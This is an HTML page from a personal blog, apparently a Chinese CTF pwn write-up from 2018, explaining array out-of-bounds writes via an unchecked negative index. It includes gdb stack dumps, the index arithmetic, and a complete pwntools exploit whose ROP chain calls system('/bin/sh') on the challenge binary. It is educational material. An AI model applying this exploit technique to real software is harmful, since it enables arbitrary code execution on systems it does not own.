@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>数组越界 | V1NKe的心情垃圾桶</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="PWN,Linux," />
+  
+
+  <meta name="description" content="数组越界">
+<meta name="keywords" content="数组越界，pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="数组越界">
+<meta property="og:url" content="http://yoursite.com/2018/06/19/数组越界之入门向/index.html">
+<meta property="og:site_name" content="V1NKe的心情垃圾桶">
+<meta property="og:description" content="数组越界">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/Users/v1nke/数组越界/屏幕快照%202018-06-19%20下午9.54.53.png">
+<meta property="og:updated_time" content="2018-06-19T15:35:08.010Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="数组越界">
+<meta name="twitter:description" content="数组越界">
+<meta name="twitter:image" content="http://yoursite.com/Users/v1nke/数组越界/屏幕快照%202018-06-19%20下午9.54.53.png">
+
+  
+
+  
+    <link rel="icon" href="/haimian.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#概述："><span class="toc-text">概述：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍："><span class="toc-text">介绍：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-数组越界原理："><span class="toc-text">0x1. 数组越界原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-正负数在计算机中的表示："><span class="toc-text">0x2. 正负数在计算机中的表示：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例题实践："><span class="toc-text">例题实践：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用思路："><span class="toc-text">利用思路：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP："><span class="toc-text">EXP：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关链接："><span class="toc-text">相关链接：</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-数组越界之入门向" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">数组越界</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.06.19</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>V1NKe</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>最近也不知道自己在干嘛，状态特别的不好，还好没有一直颓废下去，现在来写一写这几天所学到的数组越界的一些东西。（可能是因为前些日子特别自不量力的去向安恒面一个二进制实习生的位置，结果被狠狠的打脸打到自暴自弃的缘故吧。好在想通了，还是要把自己变的更优秀才是，这样才能轮到自己去选择别人了吧。）</p>
+<h2 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h2><p>这是一道月初国赛半决赛上的题，做的时候找到了32位的原题来着。。结果做的是64位的，还看不懂别人写的payload是什么意思。。</p>
+<h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><h3 id="0x1-数组越界原理："><a href="#0x1-数组越界原理：" class="headerlink" title="0x1. 数组越界原理："></a>0x1. 数组越界原理：</h3><p>0x1. 堆中的数组越界：</p>
+<p>因为堆是我们自己分配的，如果越界，那么会把堆中其他空间的数据给写掉，或读取了其他空间的数据，这样就会导致其他变量的数据变得不对，如果是一个指针的话，那么有可能会引起crash，这里我们主要谈论栈中的数组越界问题。</p>
+<p>0x2. 栈中的数组越界：</p>
+<p>因为栈是向下增长的，在进入一个函数之前，会先把参数和下一步要执行的指令地址（通过call实现）压栈，在函数的入口会把ebp压栈，并把esp赋值给ebp，在函数返回的时候，将ebp值赋给esp，pop先前栈内的上级函数栈的基地址给ebp，恢复原栈基址，然后把调用函数之前的压入栈的指令地址pop出来（通过ret实现）。</p>
+<p>栈是由高往低增长的，而数组的存储是由低位往高位存的，如果越界的话，会把当前函数的ebp和下一跳的指令地址覆盖掉，如果覆盖了当前函数的ebp，那么在恢复的时候esp就不能指向正确的地方，从而导致未可知的情况，如果下一跳的地址也被覆盖掉，那么肯定会导致crash。</p>
+<p>以下是我所画的数组元素在栈中的布局：</p>
+<p><img src="/Users/v1nke/数组越界/屏幕快照 2018-06-19 下午9.54.53.png" alt="屏幕快照 2018-06-19 下午9.54.53"></p>
+<p>这样一下看就很明显了，当你把数组的下标越过了最大索引值的时候，所指向的指针就会指向更高地址的栈空间段，所以我们就能够实现任意改写栈空间上的内容，同理，当下标为负数的时候指针会指向更低地址的栈空间段。但是这里就有一个需要注意的地方了，利用负数改写的话我们还能达到“负数变正数”的效果，这一点我们之后会讲到。</p>
+<h3 id="0x2-正负数在计算机中的表示："><a href="#0x2-正负数在计算机中的表示：" class="headerlink" title="0x2. 正负数在计算机中的表示："></a>0x2. 正负数在计算机中的表示：</h3><p>在C语言中，整数的基本数据类型分为短整型(short)，整型(int)，长整型(long)，这三个数据类型还分为有符号和无符号，每种数据类型都有各自的大小范围，(因为数据类型的大小范围是编译器决定的，所以之后所述都默认是 64 位下使用 gcc-5.4)，如下所示:</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>字节</th>
+<th style="text-align:center">范围</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>short int</td>
+<td>2byte(word)</td>
+<td style="text-align:center">0~32767(0~0x7fff)  -32768~-1(0x8000~0xffff)</td>
+</tr>
+<tr>
+<td>unsigned short int</td>
+<td>2byte(word)</td>
+<td style="text-align:center">0~65535(0~0xffff)</td>
+</tr>
+<tr>
+<td>int</td>
+<td>4byte(dword)</td>
+<td style="text-align:center">0~2147483647(0~0x7fffffff)  -2147483648~-1(0x80000000~0xffffffff)</td>
+</tr>
+<tr>
+<td>unsigned int</td>
+<td>4byte(dword)</td>
+<td style="text-align:center">0~4294967295(0~0xffffffff)</td>
+</tr>
+<tr>
+<td>long int</td>
+<td>8byte(qword)</td>
+<td style="text-align:center">正: 0~0x7fffffffffffffff  负:0x8000000000000000~0xffffffffffffffff</td>
+</tr>
+<tr>
+<td>unsigned long int</td>
+<td>8byte(qword)</td>
+<td style="text-align:center">0~0xffffffffffffffff</td>
+</tr>
+</tbody>
+</table>
+<p>了解了数组越界的原理和利用方式之后，我们就来进入实践环节。</p>
+<h3 id="例题实践："><a href="#例题实践：" class="headerlink" title="例题实践："></a>例题实践：</h3><p>check一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/parallels/Desktop/3/pwn1&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>64位，开了栈保护和nx。</p>
+<p>主程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">void hacker()</span><br><span class="line">&#123;</span><br><span class="line">  signed int j; // [rsp+8h] [rbp-78h]</span><br><span class="line">  signed int i; // [rsp+Ch] [rbp-74h]</span><br><span class="line">  __int64 v2; // [rsp+10h] [rbp-70h]</span><br><span class="line">  __int64 v3; // [rsp+18h] [rbp-68h]</span><br><span class="line">  __int64 s[11]; // [rsp+20h] [rbp-60h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;Welcome to hacker&apos;s system\n&quot;);</span><br><span class="line">  puts(&quot;Now you can set hackers&apos; age\n&quot;);</span><br><span class="line">  memset(s, 0, 0x50uLL);</span><br><span class="line">  for ( i = 0; i &lt;= 9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Enter hacker index:&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%lld&quot;, &amp;v2);</span><br><span class="line">    puts(&quot;Enter hacker age:&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%lld&quot;, &amp;v3);</span><br><span class="line">    if ( v2 &gt; 9 )</span><br><span class="line">      exit(0);</span><br><span class="line">    s[v2] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Now let&apos;s see your creation:&apos;&quot;);</span><br><span class="line">  for ( j = 0; j &lt;= 9; ++j )</span><br><span class="line">    printf(&quot;%lld &quot;, s[j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>漏洞点就出现在数组索引上面，只判断了大于9的情况，没有判断小于0的情况。所以可以利用负数来进行绕过。gdb调试一下，找出数组的栈地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffdd50:	0x0000000000000014	0x00007fffffffddf0</span><br><span class="line">0x7fffffffdd60:	0x0000000000000000	0x0000000000400881</span><br><span class="line">0x7fffffffdd70:	0x00007ffff7dd26a3	0x00000000ffffdf00</span><br><span class="line">0x7fffffffdd80:	0xfffffffffffffff8	0x0000000000000014</span><br><span class="line">0x7fffffffdd90:	0x0000000000000000	0x0000000000000000   --start</span><br><span class="line">0x7fffffffdda0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffddb0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffddc0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffddd0:	0x0000000000000000	0x0000000000000000   --end</span><br><span class="line">0x7fffffffdde0:	0x0000000000000000	0x4deabe7a5eca9400</span><br></pre></td></tr></table></figure>
+<p>0x7fffffffdd80处存储数组下标，0x7fffffffdd88处存储所要赋值给数组的内容。0x7fffffffdd90～0x7fffffffddd8处存储10个数组元素的内容。</p>
+<p>再看看hack()函数的ret返回地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffddf8</span><br></pre></td></tr></table></figure>
+<p>当我设置下标为1，内容为20的时候，栈中的内容是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffdd70:	0x00007ffff7dd26a3	0x00000000ffffdf00</span><br><span class="line">0x7fffffffdd80:	0x0000000000000001	0x0000000000000014</span><br><span class="line">0x7fffffffdd90:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffdda0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffddb0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffddc0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffddd0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffdde0:	0x0000000000000000	0xaed11199af89ad00</span><br><span class="line">0x7fffffffddf0:	0x00007fffffffde20	0x00000000004009ad</span><br></pre></td></tr></table></figure>
+<p>与上面我们所叙述的一样，当我们执行到这段汇编指令的时候：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   0x400895 &lt;hacker+158&gt;:	mov    rax,QWORD PTR [rbp-0x70]</span><br><span class="line">   0x400899 &lt;hacker+162&gt;:	mov    rdx,QWORD PTR [rbp-0x68]</span><br><span class="line">=&gt; 0x40089d &lt;hacker+166&gt;:	mov    QWORD PTR [rbp+rax*8-0x60],rdx</span><br></pre></td></tr></table></figure>
+<p>rax中存储的是索引值，rdx中存储的是内容，[rbp+rax*8-0x60]这一段实质上就是数组元素的偏移寻址，即我们上文所说的十个数组元素的存储地址寻址，rdx赋值给它，那么我们这样就可以利用负数，来修改比数组元素更低地址的空间内容了。</p>
+<p>那么这里应该就有疑问了，ret返回地址不是在数组元素地址的更高地址吗？用负数怎么能够达到修改ret地址内容的效果呢？</p>
+<p>上面我们已经了解到正负数在计算机中的表示了，为了更容易理解，我们直接实践能很快理解，我们设置下标为-1，内容为20，在栈中的表示是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffdd70:	0x00007ffff7dd26a3	0x00000000ffffdf00</span><br><span class="line">0x7fffffffdd80:	0xffffffffffffffff	0x0000000000000014</span><br><span class="line">0x7fffffffdd90:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffdda0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>可以看见-1表示成了<code>0xffffffffffffffff</code>。</p>
+<p>现在来计算我们所需要输入的下标的值为多少才能覆盖返回地址。</p>
+<p>ret地址：[rbp+0x8]</p>
+<p>指向内存：[rbp+rax*8-0x60]</p>
+<p>所以我们需要做到：<code>(rbp+rax*8-0x60)%0x10000000000000000 == rbp+0x8</code>，还有一个关键的点是还需要使rax的值为负数，即<code>0x8000000000000000&lt;rax&lt;0xffffffffffffffff</code>。</p>
+<p>这里为什么要取余数呢？因为64位程序中最高是16位(8字节)，超出了16位最高位会被截断，所以这里我们可以得到多个可用的rax值。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x800000000000000d,0xa00000000000000d,0xc00000000000000d,0xe00000000000000d</span><br></pre></td></tr></table></figure>
+<p>我们选用0xa00000000000000d来测试一下，转化成负数为<code>-6917529027641081843</code>。作为下标输入，栈中地址为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffdd80:	0xa00000000000000d	0x0000000000000014</span><br><span class="line">0x7fffffffdd90:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>再看看[rbp+rax*8-0x60]地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p $rbp+$rax*8-0x60</span><br><span class="line">$60 = (void *) 0x7fffffffddf8</span><br></pre></td></tr></table></figure>
+<p>成功任意改变栈地址内容。接下来就好构造了，有十次的机会写栈中的内容，足够了。</p>
+<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>因为本身程序中就有system函数存在，所以我们只需要写入<code>/bin/sh</code>就好了。</p>
+<ol>
+<li>利用scanf函数将<code>/bin/sh</code>写入bss段。</li>
+<li>调用system函数。</li>
+</ol>
+<p>这里具体怎么去利用就不细说了，主要讲数组越界利用的这一部分。</p>
+<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./pwn1&apos;)</span><br><span class="line">elf = ELF(&apos;pwn1&apos;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;name:\n&apos;)</span><br><span class="line">p.sendline(&apos;yzq&apos;)</span><br><span class="line">system_addr = elf.symbols[&apos;system&apos;]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">scanf_addr = elf.symbols[&apos;__isoc99_scanf&apos;]</span><br><span class="line">pop_rdi = 0x400a33  #pop rdi;ret</span><br><span class="line">pop_rsi = 0x400a31  #pop rsi;pop r15;ret</span><br><span class="line">ret_addr = 6917529027641081843  #0xa00000000000000d的负数形式</span><br><span class="line">scanf_formot = 0x400AFC</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#1</span><br><span class="line">p.recvuntil(&apos;index:\n&apos;)</span><br><span class="line">p.sendline(&apos;-%s&apos; % (ret_addr))</span><br><span class="line">p.recvuntil(&apos;age:\n&apos;)</span><br><span class="line">p.sendline(&apos;%s&apos; % (pop_rdi))</span><br><span class="line"></span><br><span class="line">#2</span><br><span class="line">p.recvuntil(&apos;index:\n&apos;)</span><br><span class="line">p.sendline(&apos;-%s&apos; % (ret_addr-1))</span><br><span class="line">p.recvuntil(&apos;age:\n&apos;)</span><br><span class="line">p.sendline(&apos;%s&apos; % (scanf_formot))</span><br><span class="line"></span><br><span class="line">#3</span><br><span class="line">p.recvuntil(&apos;index:\n&apos;)</span><br><span class="line">p.sendline(&apos;-%s&apos; % (ret_addr-2))</span><br><span class="line">p.recvuntil(&apos;age:\n&apos;)</span><br><span class="line">p.sendline(&apos;%s&apos; % (pop_rsi))</span><br><span class="line"></span><br><span class="line">#4</span><br><span class="line">p.recvuntil(&apos;index:\n&apos;)</span><br><span class="line">p.sendline(&apos;-%s&apos; % (ret_addr-3))</span><br><span class="line">p.recvuntil(&apos;age:\n&apos;)</span><br><span class="line">p.sendline(&apos;%s&apos; % (bss_addr))</span><br><span class="line"></span><br><span class="line">#5</span><br><span class="line">p.recvuntil(&apos;index:\n&apos;)</span><br><span class="line">p.sendline(&apos;-%s&apos; % (ret_addr-4))</span><br><span class="line">p.recvuntil(&apos;age:\n&apos;)</span><br><span class="line">p.sendline(&apos;%s&apos; % (0x1))  #r15不相干，随意写</span><br><span class="line"></span><br><span class="line">#6</span><br><span class="line">p.recvuntil(&apos;index:\n&apos;)</span><br><span class="line">p.sendline(&apos;-%s&apos; % (ret_addr-5))</span><br><span class="line">p.recvuntil(&apos;age:\n&apos;)</span><br><span class="line">p.sendline(&apos;%s&apos; % (scanf_addr))</span><br><span class="line"></span><br><span class="line">#7</span><br><span class="line">p.recvuntil(&apos;index:\n&apos;)</span><br><span class="line">p.sendline(&apos;-%s&apos; % (ret_addr-6))</span><br><span class="line">p.recvuntil(&apos;age:\n&apos;)</span><br><span class="line">p.sendline(&apos;%s&apos; % (pop_rdi))</span><br><span class="line"></span><br><span class="line">#8</span><br><span class="line">p.recvuntil(&apos;index:\n&apos;)</span><br><span class="line">p.sendline(&apos;-%s&apos; % (ret_addr-7))</span><br><span class="line">p.recvuntil(&apos;age:\n&apos;)</span><br><span class="line">p.sendline(&apos;%s&apos; % (bss_addr))</span><br><span class="line"></span><br><span class="line">#9</span><br><span class="line">p.recvuntil(&apos;index:\n&apos;)</span><br><span class="line">p.sendline(&apos;-%s&apos; % (ret_addr-8))</span><br><span class="line">p.recvuntil(&apos;age:\n&apos;)</span><br><span class="line">p.sendline(&apos;%s&apos; % (system_addr))</span><br><span class="line"></span><br><span class="line">#10</span><br><span class="line">p.recvuntil(&apos;index:\n&apos;)</span><br><span class="line">p.sendline(&apos;0&apos;)</span><br><span class="line">p.recvuntil(&apos;age:\n&apos;)</span><br><span class="line">p.sendline(&apos;0&apos;)</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="相关链接："><a href="#相关链接：" class="headerlink" title="相关链接："></a>相关链接：</h2><ol>
+<li><a href="https://blog.csdn.net/qq_33438733/article/details/72851639" target="_blank" rel="noopener">https://blog.csdn.net/qq_33438733/article/details/72851639</a></li>
+<li><a href="https://blog.csdn.net/human_evolution/article/details/40752047" target="_blank" rel="noopener">https://blog.csdn.net/human_evolution/article/details/40752047</a></li>
+<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/integeroverflow/intof/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/integeroverflow/intof/</a></li>
+</ol>
+
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持v1nke</div>
+        <ul>
+        
+          <li class="item">
+            <span>微信扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+          <li class="item">
+            <span>支付宝扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/06/04/一道铁三赛上的简单pwn题引发的思考/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
